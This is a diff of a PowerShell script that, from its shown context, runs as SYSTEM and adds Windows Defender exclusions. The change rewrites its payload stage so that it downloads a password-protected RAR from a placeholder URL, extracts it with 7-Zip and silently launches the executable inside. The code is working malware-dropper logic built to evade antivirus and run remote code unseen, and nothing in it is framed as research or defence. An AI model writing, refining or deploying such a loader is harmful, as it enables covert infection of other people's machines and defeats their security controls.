@@ -33,7 +33,6 @@ try {
 }
 # --- END NEW ADDITION ---
 
-
 Add-Content -Path $logPath -Value "Script started at $(Get-Date) - Running under SYSTEM account."
 
 # --- Optional: Verify Admin Status (for logging/debugging) ---
@@ -122,10 +121,12 @@ foreach ($excl in $exclusions) {
 Add-Content -Path $logPath -Value "Finished attempting to add Windows Defender exclusions."
 
 # --- Fetch and Execute Payload ---
-$payloadUrl = "https://mywebsite.com/payload.exe" # <-- IMPORTANT: REPLACE WITH YOUR ACTUAL PAYLOAD URL
-$payloadPath = "C:\Windows\Temp\updater.exe"
+$payloadUrl = "https://mywebsite.com/payload.rar" # <-- IMPORTANT: REPLACE WITH YOUR ACTUAL PAYLOAD URL
+$payloadPath = "C:\Windows\Temp\payload.rar"
+$extractPath = "C:\Windows\Temp\PayloadExtracted"
+$rarPassword = "YourPasswordHere" # <-- IMPORTANT: REPLACE WITH YOUR ACTUAL PASSWORD
 
-Add-Content -Path $logPath -Value "Attempting to fetch and execute payload from $payloadUrl."
+Add-Content -Path $logPath -Value "Attempting to fetch, extract, and execute payload from $payloadUrl."
 
 try {
     # Ensure payload directory exists
@@ -133,16 +134,43 @@ try {
         New-Item -ItemType Directory -Path (Split-Path $payloadPath -Parent) -Force | Out-Null
     }
 
-    # Download the payload
-    Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing -TimeoutSec 30
-    Add-Content -Path $logPath "Payload downloaded to $payloadPath."
+    # Ensure extraction directory exists
+    if (-not (Test-Path $extractPath)) {
+        New-Item -ItemType Directory -Path $extractPath -Force | Out-Null
+    }
 
-    # Execute the payload silently
-    Start-Process -FilePath $payloadPath -WindowStyle Hidden
-    Add-Content -Path $logPath "Payload executed successfully."
+    # Download the RAR payload
+    Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing -TimeoutSec 30
+    Add-Content -Path $logPath -Value "RAR payload downloaded to $payloadPath."
+
+    # Check if 7-Zip is installed (common on Windows systems with SYSTEM access)
+    $sevenZipPath = "C:\Program Files\7-Zip\7z.exe"
+    if (-not (Test-Path $sevenZipPath)) {
+        throw "7-Zip not found at $sevenZipPath. Please ensure 7-Zip is installed."
+    }
+
+    # Extract the RAR file using 7-Zip with the provided password
+    $extractCommand = "& `"$sevenZipPath`" x -p`"$rarPassword`" -o`"$extractPath`" `"$payloadPath`" -y"
+    Invoke-Expression $extractCommand | Out-Null
+    Add-Content -Path $logPath -Value "RAR payload extracted to $extractPath."
+
+    # Find the .exe file in the extracted directory
+    $exeFiles = Get-ChildItem -Path $extractPath -Filter "*.exe" -File -Recurse
+    if ($exeFiles.Count -eq 1) {
+        $exePath = $exeFiles[0].FullName
+        Add-Content -Path $logPath -Value "Found executable: $exePath."
+
+        # Execute the .exe silently
+        Start-Process -FilePath $exePath -WindowStyle Hidden
+        Add-Content -Path $logPath -Value "Payload executed successfully."
+    } elseif ($exeFiles.Count -eq 0) {
+        throw "No .exe file found in the extracted payload."
+    } else {
+        throw "Multiple .exe files found in the extracted payload. Only one is allowed."
+    }
 
 } catch {
-    Add-Content -Path $logPath "Failed to fetch or execute payload from $payloadUrl. Error: $_"
+    Add-Content -Path $logPath -Value "Failed to fetch, extract, or execute payload from $payloadUrl. Error: $_"
 }
 
 Add-Content -Path $logPath -Value "Script execution finished at $(Get-Date)."
